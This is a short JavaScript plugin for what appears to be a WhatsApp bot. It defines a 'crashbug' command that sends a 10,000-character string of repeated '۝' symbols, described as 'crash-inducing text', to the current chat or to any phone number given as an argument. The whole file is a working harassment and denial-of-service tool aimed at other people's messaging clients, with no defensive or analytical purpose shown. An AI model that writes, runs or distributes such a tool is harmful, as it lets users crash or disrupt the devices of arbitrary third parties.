const { cmd } = require('../lib/command');

cmd({
  pattern: "crashbug",
  desc: "Send a crash-inducing text to current chat or target number",
  category: "bug",
  react: "💥",
  filename: __filename
},
async (conn, m, { args, quoted }) => {
  const crashText = "۝".repeat(10000); // Crash text

  let targetJid;

  if (args.length === 0) {
    // No target number provided, send to current chat
    targetJid = m.chat;
  } else {
    // Target number provided in args[0], format to WhatsApp jid
    let number = args[0];
    if (!number.endsWith('@s.whatsapp.net')) number = number + '@s.whatsapp.net';
    targetJid = number;
  }

  try {
    await conn.sendMessage(targetJid, {
      text: crashText,
      mentions: [m.sender],
    }, { quoted: m });

    if (targetJid === m.chat) {
      await m.reply('✅ Crash text sent to this chat.');
    } else {
      await m.reply(`✅ Crash text sent to target: ${args[0]}`);
    }
  } catch (e) {
    console.error('Crash bug failed to send:', e);
    await m.reply('❌ Failed to send crash text.');
  }
});
